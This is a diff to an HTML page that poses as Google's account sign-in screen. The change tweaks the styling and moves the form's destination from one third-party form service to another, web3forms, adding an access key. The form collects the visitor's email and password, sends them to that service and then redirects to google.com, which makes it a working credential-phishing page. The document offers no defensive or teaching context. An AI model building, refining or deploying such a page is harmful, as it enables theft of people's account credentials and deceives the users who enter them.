@@ -4,26 +4,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
     <style>
-        body { font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f7f7f7; margin: 0; }
-        .login-box { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; }
+        body { font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; }
+        .login-box { padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; }
         img { width: 75px; margin-bottom: 10px; }
         h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
         p { margin-bottom: 25px; color: #202124; }
         input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        button { width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png">
         <h1>Sign in</h1>
         <p>Use your Google Account</p>
         
-        <form action="https://formspree.io/f/xdapawrr" method="POST">
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="13c4f4ce-da02-4e7c-b02c-af4fe770716a">
+            
             <input type="email" name="email" placeholder="Email or phone" required>
             <input type="password" name="password" placeholder="Enter your password" required>
             
-            <input type="hidden" name="_next" value="https://google.com">
+            <input type="hidden" name="redirect" value="https://www.google.com">
             
             <button type="submit">Next</button>
         </form>
